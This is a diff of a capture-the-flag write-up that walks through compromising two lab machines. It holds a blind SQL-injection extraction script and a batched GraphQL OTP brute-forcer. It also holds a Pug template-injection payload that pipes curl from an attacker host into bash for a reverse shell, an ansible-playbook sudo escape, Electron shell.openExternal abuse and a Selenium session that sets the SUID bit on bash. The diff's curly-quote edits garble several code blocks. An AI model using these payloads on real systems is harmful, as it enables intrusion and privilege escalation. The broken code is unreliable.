@@ -15,8 +15,8 @@ We start with a simple `nmap` scan with the basic options
 
 ```bash
 hcue@pjsk:~ » nmap -sC -sV -v 10.129.228.37
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    nginx 1.18.0 (Ubuntu)
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
 ```
 
 The output shows that ports 22 (SSH) and 80 (HTTP) are open on the target IP address. The SSH service is running OpenSSH version 8.2p1 on Ubuntu Linux. The HTTP service is running nginx version 1.18.0 on Ubuntu Linux.
@@ -28,61 +28,66 @@ Checking the Webserver running on port 80. We having nothing interesting, pretty
 Since, there is no domains until now. We can proceed to fuzz for hidden directories with gobuster.
 
 ```bash
-hcue@pjsk:~ » gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u http://10.129.228.37
+hcue@pjsk:~ » gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u http://10.129.228.37
 ===============================================================
 Gobuster v3.2.0-dev
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://10.129.228.37
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.2.0-dev
-[+] Timeout:                 10s
+[+] Url:                     http://10.129.228.37
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.2.0-dev
+[+] Timeout:                 10s
 ===============================================================
 2022/12/05 02:50:25 Starting gobuster in directory enumeration mode
 ===============================================================
-/admin                (Status: 200) [Size: 863]
+/admin                (Status: 200) [Size: 863]
 ```
 
 And we discover that there is a hidden `/admin` endpoint. Which is a simple admin login page.
 
 ![Admin Login](/static/images/stack-the-flags-2022/admin-login.png)
 
-I will try to login with some dummy/default credentails. But that didn't help.
+I will try to login with some dummy/default credentials. But that didn’t help.
 Checking Burp HTTP history for the requests.
 
-![Query Mutation](/static/images/stack-the-flags-2022/query-mutation.png)
 
-GraphQL is a popular query language for APIs that allows clients to query and mutate data on a server. This mutation queries a LoginUser function with the provided username and password. The function is expected to return a message and a token if the login is successful.
-
-```json
-mutation {
-    LoginUser(username: "admin", password: "admin"){
-        message
-        token
-    }
+```graphql
+{
+ "query":{\n    LoginUser{username: \"admin\",password : \"admin\"}{\n     message,\n   token \n}\n}"
 }
 ```
 
-The first i tried was introspection. which allows clients to inspect the schema of a GraphQL server to understand the data and operations that are available. But it didn't lead to anything.
+GraphQL is a popular query language for APIs that allows clients to query and mutate data on a server. This mutation queries a LoginUser function with the provided username and password. The function is expected to return a message and a token if the login is successful.
+
+```graphql
+mutation {
+    LoginUser(username: "admin", password: "admin"){
+        message
+        token
+    }
+}
+```
+
+The first thing I tried was introspection. which allows clients to inspect the schema of a GraphQL server to understand the data and operations that are available. But it didn’t lead to anything.
 
 ### Exploitation
 
-Then, I've tried to add bad characters in the username field.
+Then, I’ve tried to add bad characters in the username field.
 Adding a single quote results in an interesting error.
 
-![Query Testing Sqli](/static/images/stack-the-flags-2022/query-testing-sqli.png)
-
-It seems like the username field is vulnerable to an sql injection. Since GraphQL is somehow interacting with the sql database, We'll not be able to bypass the login with it.
+```graphql
+{
+ "query":{\n    LoginUser{username: \"admin'\",password : \"admin\"}{\n     message,\n   token \n}\n}"
+}
+```
+It seems like the username field is vulnerable to an sql injection. Since GraphQL is somehow interacting with the sql database, We’ll not be able to bypass the login with it.
 
 ![Trying Sqli Query](/static/images/stack-the-flags-2022/trying-sqli-query.png)
 
-For the sake of this part, I'll be using a time-based blind SQL injection attack to extract information from a GraphQL server. The code sends a series of HTTP requests to the server, each containing a slightly different GraphQL query, and measures the time taken for the server to respond to each request. By comparing the response times of different requests, the code is able to determine which requests were successful in extracting information from the server.
-
-If the response time is greater than 2 seconds, the code assumes that the query was successful in extracting information from the server, and the character that was used in the query is appended to the `res` string.
-In this case, I just guessed the table name and collumns and i got a delay
+For the sake of this part, I’ll be using a time-based blind SQL injection attack to extract information from a GraphQL server. The code sends a series of HTTP requests to the server, each containing a slightly different GraphQL query, and measures the time taken for the server to respond to each request. By comparing the response times of different requests, the code is able to determine which requests were successful in extracting information from the server.If the response time is greater than 2 seconds, the code assumes that the query was successful in extracting information from the server, and the character that was used in the query is appended to the `res` string.In this case, I just guessed the table name and collumns and I got a delay.
 
 ```python
 import requests
@@ -92,62 +97,65 @@ import os
 printable="0123456789abcdefABCDEFGHIJKLMNOPQRSTUVWXYZ"
 res=""
 while True:
-    for char in printable:
-        time.sleep(0.6)
-        session = requests.session()
-        burp0_url = "http://10.129.255.194:80/graphql"
-        burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://10.129.255.194", "Referer": "http://10.129.255.194/admin", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
-        burp0_json={"query": "mutation {\n    LoginUser(username: \"-12' or (select sleep(2) from dual where (SELECT username from users ) like '"+res+char+"%')-- \", password: \"a\"){\n        message,\n        token    \n}\n}"}
-        #print(burp0_json)
-        start = time.perf_counter()
-        session.post(burp0_url, headers=burp0_headers, json=burp0_json)
-        request_time = time.perf_counter() - start
-        #print("[Char: ]"+char+" "+str(request_time))
-        if request_time > 2:
-            res+=char
-            print("result: "+res)
-            break
+    for char in printable:
+        time.sleep(0.6)
+        session = requests.session()
+        burp0_url = "http://10.129.255.194:80/graphql"
+        burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://10.129.255.194", "Referer": "http://10.129.255.194/admin", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
+        burp0_json={"query": "mutation {\n    LoginUser(username: \"-12’ or (select sleep(2) from dual where (SELECT username from users ) like ’"+res+char+"%’)-- \", password: \"a\"){\n        message,\n        token    \n}\n}"}
+        #print(burp0_json)
+        start = time.perf_counter()
+        session.post(burp0_url, headers=burp0_headers, json=burp0_json)
+        request_time = time.perf_counter() - start
+        #print("[Char: ]"+char+" "+str(request_time))
+        if request_time > 2:
+            res+=char
+            print("result: "+res)
+            break
 ```
 
-We run the script and we're able to retrieve the username!
+We run the script and we’re able to retrieve the username!
 
 ```bash
-hcue@pjsk:/tmp » python3 sql.py                                                       result: J
+hcue@pjsk:/tmp » python3 sql.py
+result: J
 result: Jo
 result: Joh
 result: John
 ```
 
-Just for the sake of the length of the writeup, We can do the same script to retrieve the md5 of John user and crack it with `Crackstation` to get `iamcool`.
+Just for the sake of the length of the writeup, we can do the same script to retrieve the MD5 of John user and crack it with `Crackstation` to get `iamcool`.
 
-Logging in with user `John:iamcool` Works and we're greeted with 2FA.
+Logging in with user `John:iamcool` Works and we’re greeted with 2FA.
 
-![Otp Web](/static/images/stack-the-flags-2022/otp-web.png)
+![A screenshot of OTP verification form. OTP will be sent through email, and will expire in 2 minutes](/static/images/stack-the-flags-2022/otp-web.png)
 
-I tried to provide a random OTP to check the request and it's a graphql query aswell
+I tried to provide a random OTP to check the request and it’s a graphql query aswell
 
-![Query Otp](/static/images/stack-the-flags-2022/query-otp.png)
+```graphql
+{
+ "query":{\n    verify2FA{otp: \"1234\"}{\n     message,\n   token \n}\n}"
+}
+```
 
 This GraphQL mutation queries a `verify2FA` function with the provided one-time password (OTP). The function is expected to return a message and a token if the OTP is valid.
 
-The first thing i tried was to bruteforce but there is a ratelimit implemented which makes it quite impossible as the the OTP expires after 2 minutes.
+The first thing I tried was to bruteforce but there is a ratelimit implemented which makes it quite impossible as the the OTP expires after 2 minutes.
 
-![Rate-limit](/static/images/stack-the-flags-2022/rate-limit.png)
+![A screenshot which shows that we're been rate limited](/static/images/stack-the-flags-2022/rate-limit.png)
 
-Since, We're not able to bruteforce it. I tried using GraphQL Batching, Which is prove performance by reducing the number of round trips between the client and the server. However, if not properly implemented, it can also create vulnerabilities that can be exploited. In our case, We will send a batch request containing a mix of legitimate and malicious queries. The server processes the legitimate queries and returns the results to us.
+Since we’re not able to bruteforce it, I tried using GraphQL Batching, which is prove performance by reducing the number of round trips between the client and the server. However, if not properly implemented, it can also create vulnerabilities that can be exploited. In our case, we will send a batch request containing a mix of legitimate and malicious queries. The server processes the legitimate queries and returns the results to us. In simpler words, We will be attempting to exploit a vulnerability in a GraphQL server that allows batching of multiple queries in a single request.
 
-In simpler words, We will be attempting to exploit a vulnerability in a GraphQL server that allows batching of multiple queries in a single request.
-
-We will create a function that generates a GraphQL mutation containing multiple `verify2FA` queries with different one-time password (OTP) values and constructs a GraphQL mutation containing these queries and returns it. This is needed because, we won't be able to send all the OTP values at once.
+We will create a function that generates a GraphQL mutation containing multiple `verify2FA` queries with different one-time password (OTP) values and constructs a GraphQL mutation containing these queries and returns it. This is needed because, we won’t be able to send all the OTP values at once.
 
 ```python
 def gen_payload(i):
-    final=""
-    for token in ["%04d" % i for i in range(i,i+500)]:
-        single ='\n    jaja'+token+' : verify2FA(otp: \"'+token+'\"){\n        message,\n        token    }\n '
-        final+=single
-    payload = 'mutation {\n   '+final+'  \n}'
-    return payload
+    final=""
+    for token in ["%04d" % I for I in range(i,i+500)]:
+        single =’\n    jaja’+token+’ : verify2FA(otp: \"’+token+’\"){\n        message,\n        token    }\n ’
+        final+=single
+    payload = ’mutation {\n   ’+final+’  \n}’
+    return payload
 ```
 
 Then we just keep bruteforcing until we get a hit and get the new token.
@@ -155,54 +163,52 @@ Then we just keep bruteforcing until we get a hit and get the new token.
 ```python
 import requests
 while True:
-    session = requests.session()
-    burp0_url = "http://10.129.255.194:80/graphql"
-    burp0_cookies = {"session": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpvaG4iLCJvdHBfdmVyaWZpY2F0aW9uIjpmYWxzZSwiaWF0IjoxNjcwMDIwMDYyLCJleHAiOjE2NzAwMjM2NjJ9.r624Ftvgxhuo7rNPeI1JeJpQzVTXON6cNpN0EAmABiE"}
-    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://10.129.255.194", "Referer": "http://10.129.255.194/admin/otp_verfification", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
-    burp0_json={"query": gen_payload(i)}
-    rar = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
-    print(rar.text)
-    if ("token" in rar.text):
-        print("hurray: ",i)
-        break
-    i+=500
+    session = requests.session()
+    burp0_url = "http://10.129.255.194:80/graphql"
+    burp0_cookies = {"session": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpvaG4iLCJvdHBfdmVyaWZpY2F0aW9uIjpmYWxzZSwiaWF0IjoxNjcwMDIwMDYyLCJleHAiOjE2NzAwMjM2NjJ9.r624Ftvgxhuo7rNPeI1JeJpQzVTXON6cNpN0EAmABiE"}
+    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://10.129.255.194", "Referer": "http://10.129.255.194/admin/otp_verfification", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
+    burp0_json={"query": gen_payload(i)}
+    rar = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
+    print(rar.text)
+    if ("token" in rar.text):
+        print("hurray: ",i)
+        break
+    i+=500
 ```
 
 And we just run the script until we get a hit
 
-![token-got](/static/images/stack-the-flags-2022/token-got.png)
+![A screenshot that shows that we got a valid token](/static/images/stack-the-flags-2022/token-got.png)
 
 Now we can use the new token to access the dashboard
 
-![Dashboard-admin](/static/images/stack-the-flags-2022/dashboard-admin.png)
+![A screenshot of the admin dashboard](/static/images/stack-the-flags-2022/dashboard-admin.png)
 
 In the `/admin/setting` endpoint. We have a way to render a template!
 
-![Admin ssti template](/static/images/stack-the-flags-2022/admin-ssti-template.png)
+![A screenshot of the admin templates section](/static/images/stack-the-flags-2022/admin-ssti-template.png)
 
 So the first thing that comes in mind now is we find an SSTI.
 
-Knowing from the `Response Headers` that we're dealing with an Express nodejs server.
-
-![headers](/static/images/stack-the-flags-2022/headers.png)
+Knowing from the `Response Headers` that we’re dealing with an Express nodejs server.
 
 I just tried a bunch of payloads `{{7*7}} ${7*7} #{7*7}` And the `#{7*7}` works.
 
-![pugssti-template](/static/images/stack-the-flags-2022/pugssti-template.png)
+![A screenshot that shows the execution of pug ssti](/static/images/stack-the-flags-2022/pugssti-template.png)
 
-This means that we're dealing with a `pug ssti`.  I'll be using the following payload, Where I am hosting a bash reverse shell in my local webserver and piping into bash.
+This means that we’re dealing with a `pug ssti`.  I’ll be using the following payload, Where I am hosting a bash reverse shell in my local webserver and piping into bash.
 
-```node
-#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.57 | bash')}()}
+```js
+#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec(’curl 10.10.14.57 | bash’)}()}
 ```
 
-And i get a shell as john and grab the flag
+And I get a shell as john and grab the flag
 
 ```bash
 hcue@pjsk:/tmp » rlwrap nc -lvnp 443
 listening on [any] 443 ...
 connect to [10.10.14.57] from (UNKNOWN) [10.129.228.37] 44176
-can't access tty; job control turned off
+can’t access tty; job control turned off
 $ id
 $ cd ~
 $ cat user.txt
@@ -214,26 +220,26 @@ STF22{g410f27d35f21325f47d83c375dedf32}
 First, I will stabilize my shell
 
 ```bash
-$ python3 -c "import pty;pty.spawn('/bin/bash')"
+$ python3 -c "import pty;pty.spawn(’/bin/bash’)"
 john@bautycare:~$
-[1]  + 583791 suspended  rlwrap nc -lvnp 443
-hcue@pjsk:/tmp » stty raw -echo;fg                                                                           148 ↵
-[1]  + 583791 continued  rlwrap nc -lvnp 443
+[1]  + 583791 suspended  rlwrap nc -lvnp 443
+hcue@pjsk:/tmp » stty raw -echo;fg                                                                           148 ↵
+[1]  + 583791 continued  rlwrap nc -lvnp 443
 john@beautycare:~$
 john@beautycare:~$ export TERM=xterm
 export TERM=xterm
 john@beautycare:~$
 ```
 
-Then, I'll check if we have any sudo rights
+Then, I’ll check if we have any sudo rights
 
 ```bash
 john@beautycare:~$ sudo -l
 Matching Defaults entries for john on beautycare:
-    env_reset, mail_badpass,
+    env_reset, mail_badpass,
 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 User john may run the following commands on beautycare:
-    (root) NOPASSWD: /usr/bin/ansible-playbook
+    (root) NOPASSWD: /usr/bin/ansible-playbook
 john@beautycare:~$
 ```
 
@@ -241,7 +247,7 @@ I just searched this binary in gtfobins and grabbed
 
 ```bash
 TF=$(mktemp)
-echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
+echo ’[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]’ >$TF
 sudo /usr/bin/ansible-playbook $TF
 ```
 
@@ -249,13 +255,13 @@ sudo /usr/bin/ansible-playbook $TF
 
 ```bash
 TF=$(mktemp)
-echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
+echo ’[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]’ >$TF
 TF=$(mktemp)
 john@beautycare:~$ sudo /usr/bin/ansible-playbook $TF
-echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
+echo ’[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]’ >$TF
 john@beautycare:~$ sudo /usr/bin/ansible-playbook $TF
 [WARNING]: provided hosts list is empty, only localhost is available. Note that
-the implicit localhost does not match 'all'
+the implicit localhost does not match ’all’
 PLAY [localhost] **************************************************************
 TASK [Gathering Facts] *********************************************************
 ok: [localhost]
@@ -270,7 +276,7 @@ cat /root/root.txt
 STF22{3f62f62107c411482f5bc8caff1843e2}
 ```
 
-And that's it \\o/
+And that’s it \\o/
 
 ## Electrogrid (Fullpwn, 2000 Points)
 
@@ -342,9 +348,9 @@ hcue@pjsk:/tmp/userland/resources » ls
 app.asar
 ```
 
-An `asar` file is a package file used by the Electron framework to store application code and other assets. So at this point, we'll know that we'll be dealing with an electron application.
+An `asar` file is a package file used by the Electron framework to store application code and other assets. So at this point, we’ll know that we’ll be dealing with an electron application.
 
-I'll use the following command to extract its content
+I’ll use the following command to extract its content
 
 ```bash
 npx asar extract app.asar extract
@@ -366,23 +372,23 @@ drwxr-xr-x  2 hcue hcue 4096 Dec  5 04:58 static
 -rwxr-xr-x  1 hcue hcue 1029 Dec  5 04:58 webpack.common.js
 ```
 
-Checking the `index.js` file. we can notice an interesting function that's is being called
+Checking the `index.js` file. we can notice an interesting function that’s is being called
 
 ```js
-ipcMain.on('handle-links', (event, task, url) => {
-  if (task === 'download') {
-    const downloadPath = '/opt/userland/'
-    const filename = url.split('/').pop()
+ipcMain.on(’handle-links’, (event, task, url) => {
+  if (task === ’download’) {
+    const downloadPath = ’/opt/userland/’
+    const filename = url.split(’/’).pop()
     const filepath = `${downloadPath}${filename}`
 
     fs.access(filepath, fs.F_OK, async (err) => {
       if (err) {
         await download(BrowserWindow.getFocusedWindow(), url, { directory: downloadPath })
-        win.webContents.send('file-downloaded', `File Imported at: ${downloadPath}${filename}`)
+        win.webContents.send(’file-downloaded’, `File Imported at: ${downloadPath}${filename}`)
         return
       }
 
-      win.webContents.send('file-downloaded', `File Already Exists At: ${downloadPath}${filename}`)
+      win.webContents.send(’file-downloaded’, `File Already Exists At: ${downloadPath}${filename}`)
     })
   } else {
     shell.openExternal(url)
@@ -390,51 +396,51 @@ ipcMain.on('handle-links', (event, task, url) => {
 })
 ```
 
-The code listens for an `'handle-links'` event on the `ipcMain` module, which is used to communicate between the main process and renderer processes in Electron.
-When the `'handle-links'` event is received, the code checks the value of the `task` argument to determine the desired action. If the `task` argument is `'download'`, the code extracts the filename from the `url`. And here's comes the interesting part, where urls are passed to the `shell.openExternal` functio which allows this application to open a URL in the webrowser. Researching about this function we see that it can allow us to execute arbitrary code on the user's system. Another possible way, is that in case we have control over the `filename` variable, we will eventually have file overwrite with directory traversal.
+The code listens for an `’handle-links’` event on the `ipcMain` module, which is used to communicate between the main process and renderer processes in Electron.
+When the `’handle-links’` event is received, the code checks the value of the `task` argument to determine the desired action. If the `task` argument is `’download’`, the code extracts the filename from the `url`. And here’s comes the interesting part, where urls are passed to the `shell.openExternal` functio which allows this application to open a URL in the webrowser. Researching about this function we see that it can allow us to execute arbitrary code on the user’s system. Another possible way, is that in case we have control over the `filename` variable, we will eventually have file overwrite with directory traversal.
 
-We'll back to this later, once we understand how this application works.
+We’ll back to this later, once we understand how this application works.
 
-In the `src/js` folder, we have `app.js` which seems to be packed. Without cleaning it, we can notice that's it talking with an api where it takes the URL from `config.json` which seems missing from source.
+In the `src/js` folder, we have `app.js` which seems to be packed. Without cleaning it, we can notice that’s it talking with an api where it takes the URL from `config.json` which seems missing from source.
 
-```node
+```js
 _config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL
 ```
 
-```node
+```js
 /* harmony import */ var _config_json__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(
-  /*! ./config.json */ './src/js/config.json'
+  /*! ./config.json */ ’./src/js/config.json’
 )
 ```
 
 Since we know/assumed that we have an api running on port 9000.
 `BACKEND_URL` should `http://10.129.228.64:9000`.
 
-Reading much further, we can see an api call to `/api/login`. where we find credentails for the `developer` user.
+Reading much further, we can see an api call to `/api/login`. where we find credentials for the `developer` user.
 
-```node
-fetch(''.concat(_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL, '/api/login'), {
-  method: 'POST',
+```js
+fetch(’’.concat(_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL, ’/api/login’), {
+  method: ’POST’,
   headers: {
-    Accept: 'application/json',
-    'Content-Type': 'application/json',
+    Accept: ’application/json’,
+    ’Content-Type’: ’application/json’,
   },
   body: JSON.stringify({
-    username: 'developer',
-    password: '5up3rd3vl0per!!',
+    username: ’developer’,
+    password: ’5up3rd3vl0per!!’,
   }),
 })
   .then((res) => res.json())
   .then((data) => {
     if (data.status === 200) {
-      localStorage.setItem('token', data.token)
-      localStorage.setItem('username', data.username)
+      localStorage.setItem(’token’, data.token)
+      localStorage.setItem(’username’, data.username)
       setLoading(false)
     }
   })
 ```
 
-I tried using the api that we have to confirm that it's talking with it. And it works!
+I tried using the api that we have to confirm that it’s talking with it. And it works!
 
 ```http
 HTTP/1.1 200 OK
@@ -448,11 +454,11 @@ Connection: close
 
 We can see multiple endpoints including `/api/chats/allChats`
 
-```node
+```js
 fetch("".concat(_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL, "/api/chats/allChats"), {
-              method: 'GET',
+              method: ’GET’,
               headers: {
-                token: localStorage.getItem('token')
+                token: localStorage.getItem(’token’)
               }
             }).then(data => {
               return data.json();
@@ -462,7 +468,7 @@ fetch("".concat(_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL, "/api/cha
           }, []);
 ```
 
-I tried fetching it using the token i retrieved from the login.
+I tried fetching it using the token I retrieved from the login.
 
 ```http
 HTTP/1.1 200 OK
@@ -482,24 +488,24 @@ The service checkup script that you created is not working anymore with the sele
 
 For now, this might be irrelevent us until we check the other endpoints.
 
-```node
+```js
 fetch("".concat(_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL, "/api/chats/").concat(currentChat, "/add"), {
-                method: 'POST',
+                method: ’POST’,
                 headers: {
-                  'Accept': 'application/json',
-                  'Content-Type': 'application/json',
-                  'token': localStorage.getItem('token')
+                  ’Accept’: ’application/json’,
+                  ’Content-Type’: ’application/json’,
+                  ’token’: localStorage.getItem(’token’)
                 },
 ```
 
-```node
+```js
 var uploadFile = e => {
             var formData = new FormData();
-            formData.append('uploadedFile', e.target.files[0]);
+            formData.append(’uploadedFile’, e.target.files[0]);
             fetch("".concat(_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL, "/api/").concat(currentChat, "/upload"), {
-              method: 'POST',
+              method: ’POST’,
               headers: {
-                'token': localStorage.getItem('token')
+                ’token’: localStorage.getItem(’token’)
               },
               body: formData
             }).
@@ -507,11 +513,11 @@ var uploadFile = e => {
 
 And now we have a way to interact with users by sending them files and messages!
 
-Now, let's back to the message that we got earlier. Where the users were talking about a selenium script. Selenium allows to write test scripts or bots that interact with a web application in a similar way to how a user would interact with the application.
+Now, let’s back to the message that we got earlier. Where the users were talking about a selenium script. Selenium allows to write test scripts or bots that interact with a web application in a similar way to how a user would interact with the application.
 
 We can assume now, that we will have to trick the bot into downloading our files or interacting with our messages!
 
-Here's an example on how we can use both `/add` and `/upload` api to download/add files/messages
+Here’s an example on how we can use both `/add` and `/upload` api to download/add files/messages
 
 ```http
 POST /api/chats/admin/add HTTP/1.1
@@ -556,19 +562,19 @@ pwned
 
 > This part is not needed to continue exploitation & Understanding the exploit path
 
-So, if we try to open the GUI application. It will keep hanging and that's because it wasn't able to reach the api as the `config.json` file which includes the `BACKEND_URL` variable is missing
+So, if we try to open the GUI application. It will keep hanging and that’s because it wasn’t able to reach the api as the `config.json` file which includes the `BACKEND_URL` variable is missing
 
 so here we have two options:
 
 1. Create the `config.json` file with the proper `BACKEND_URL`, which is the instance ip
-2. The lazy way (Which i used XD) is to change all the `_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL` to the ip instance.
+2. The lazy way (Which I used XD) is to change all the `_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL` to the ip instance.
 
-![VSCode-replace](/static/images/stack-the-flags-2022/vscode-replace.png)
+![A screenshot of replacing strings with vscode](/static/images/stack-the-flags-2022/vscode-replace.png)
 
 Another thing to change is the CSP in the `index.html`.
-We can either change `127.0.0.1` to the machine ip or (as you probably already guessed as i am lazy) just remove the whole CSP
+We can either change `127.0.0.1` to the machine ip or (as you probably already guessed as I am lazy) just remove the whole CSP
 
-![html-csp](/static/images/stack-the-flags-2022/html-csp.png)
+![A screenshot that shows the Content Security Policy of the Web page](/static/images/stack-the-flags-2022/html-csp.png)
 
 then we can run the app
 
@@ -576,11 +582,11 @@ then we can run the app
 hcue@pjsk:~/htb/medimelecro/resources » electron extract
 ```
 
-![APP GUI](/static/images/stack-the-flags-2022/app-gui.png)
+![A screenshot of the Electron App GUI](/static/images/stack-the-flags-2022/app-gui.png)
 
 We can also see also the previous conversation that we extracted from the web api
 
-![Admin Chat GUI](/static/images/stack-the-flags-2022/admin-chat-gui.png)
+![A screenshot of the Admin chat with the developer](/static/images/stack-the-flags-2022/admin-chat-gui.png)
 
 ### Exploitation
 
@@ -591,7 +597,7 @@ To wrap everything we found until now
 - We can upload messages to the admin user
 - Messages mentioning the usage of a selenium scripts
 
-The only exploitation path we can see is that we assume that there is a bot that's either downloading the files or clicking the urls (or maybe both? ;) ).
+The only exploitation path we can see is that we assume that there is a bot that’s either downloading the files or clicking the urls (or maybe both? ;) ).
 
 To achieve RCE, we will trick the bot into opening our malicious `.desktop` file which will contain our reverse shell
 
@@ -607,7 +613,7 @@ We will trick the user to open our link, which will be passed to `shell.openExte
 <a className="an" open href="LINK">test</a>
 ```
 
-At this point, we don't know wether the bot will download the script or not. We can try both approachs.
+At this point, we don’t know wether the bot will download the script or not. We can try both approachs.
 
 1. The easy way is just to host the file in a localwebserver
 
@@ -631,16 +637,16 @@ In this case our payload will be
 
 Once we make sure the payload is hosted/downloaded we can send the html payload and wait until we get a shell
 
-![payload-xss-rendered](/static/images/stack-the-flags-2022/payload-xss-rendered.png)
+![A screenshot that shows that our XSS payload is rendered](/static/images/stack-the-flags-2022/payload-xss-rendered.png)
 
 And we get a shell back!
 
-![user-flag-john](/static/images/stack-the-flags-2022/user-flag-john.png)
+![A screenshot where we got a shell back as john](/static/images/stack-the-flags-2022/user-flag-john.png)
 
 ### Privilege Escalation
 
-The first thing i've checked is the running processes as root.
-In this case, I've found a selenium server running as root locally.
+The first thing i’ve checked is the running processes as root.
+In this case, I’ve found a selenium server running as root locally.
 
 ```bash
 root         623       1  0 14:12 ?        00:00:00 /usr/sbin/cron -f -P
@@ -652,9 +658,9 @@ root         643     641  0 14:12 ?        00:00:31          \_ java -jar /root/
 The idea to exploit selenium, is to create a session that executes code.
 In simpler words, we can achieve RCE through geckodriver.
 
-First i'll forward the port `4444` running locally on the machine to my local machine using `chisel`.
+First i’ll forward the port `4444` running locally on the machine to my local machine using `chisel`.
 
-I'll first run a chisel server on my machine
+I’ll first run a chisel server on my machine
 
 ```
 hcue@pjsk:~/htb-trustable » chisel server -p 8888 --reverse
@@ -663,7 +669,7 @@ hcue@pjsk:~/htb-trustable » chisel server -p 8888 --reverse
 2022/12/05 06:10:10 server: Listening on http://0.0.0.0:8888
 ```
 
-Download chisel to the remote machine and i'll forward the port
+Download chisel to the remote machine and i’ll forward the port
 
 ```
 john@electrogrid:/dev/shm$ wget 10.10.14.57/chisel
@@ -672,7 +678,7 @@ john@electrogrid:/dev/shm$ ./chisel client 10.10.14.57./chisel client 10.10.14.5
 ./chisel client 10.10.14.57:8888 R:4444:127.0.0.1:4444 &
 ```
 
-And we'll get a connection
+And we’ll get a connection
 
 ```
 2022/12/05 06:11:47 server: session#1: tun: proxy#R:4444=>4444: Listening
@@ -680,9 +686,9 @@ And we'll get a connection
 
 Now we can access the Selenium Grid from our machine
 
-![selenium-grid-web](/static/images/stack-the-flags-2022/selenium-grid-web.png)
+![A screenshot of selenium web grid interface](/static/images/stack-the-flags-2022/selenium-grid-web.png)
 
-And now i'll create the malicious session where it will set the suid bit to the `/bin/bash` binary
+And now i’ll create the malicious session where it will set the suid bit to the `/bin/bash` binary
 
 ```http
 POST /wd/hub/session HTTP/1.1
@@ -700,7 +706,7 @@ Content-Length: 276
             "browserName": "chrome",
             "goog:chromeOptions": {
                 "binary": "/usr/bin/python3",
-                "args": ["-cimport os;os.system('chmod u+s /bin/bash')"]
+                "args": ["-cimport os;os.system(’chmod u+s /bin/bash’)"]
             }
         }
     }
@@ -709,9 +715,9 @@ Content-Length: 276
 
 After making the request, we can see in the UI that our request is in queue.
 
-![selenium-web-queue](/static/images/stack-the-flags-2022/selenium-web-queue.png)
+![A screenshot of the Selenium Web queue that shows our payload](/static/images/stack-the-flags-2022/selenium-web-queue.png)
 
-Once it disspears from the queue, it means it's finished.
+Once it disspears from the queue, it means it’s finished.
 
 We can go back to the remote machine and check
 
@@ -740,7 +746,7 @@ Note: This will be a short writeup as I used two unintended ways to get system o
 
 ### Enumeration
 
-I'll start with an `nmap` scan with the usual options
+I’ll start with an `nmap` scan with the usual options
 
 ```
 Discovered open port 80/tcp on 10.129.254.249
